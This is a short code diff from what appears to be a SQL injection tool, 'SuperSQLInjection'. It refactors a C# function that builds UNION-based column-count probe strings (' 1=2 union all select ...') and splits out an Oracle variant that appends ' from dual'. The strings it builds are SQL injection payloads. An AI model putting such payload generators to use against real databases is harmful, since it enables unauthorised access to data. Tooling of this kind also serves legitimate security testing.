@@ -48,6 +48,12 @@ namespace SuperSQLInjection.payload
 
         public static String unionColumnCountTestByOracle(int maxColumn,int testIndex,String fill)
         {
+            
+            return unionColumnCountTest(maxColumn,testIndex,fill) + " from dual";
+        }
+
+        public static String unionColumnCountTest(int maxColumn, int testIndex, String fill)
+        {
             StringBuilder sb = new StringBuilder(" 1=2 union all select ");
             for (int i = 1; i <= maxColumn; i++)
             {
@@ -61,8 +67,9 @@ namespace SuperSQLInjection.payload
                 }
             }
             sb.Remove(sb.Length - 1, 1);
-            return sb.ToString() + " from dual";
+            return sb.ToString();
         }
+
 
 
     }
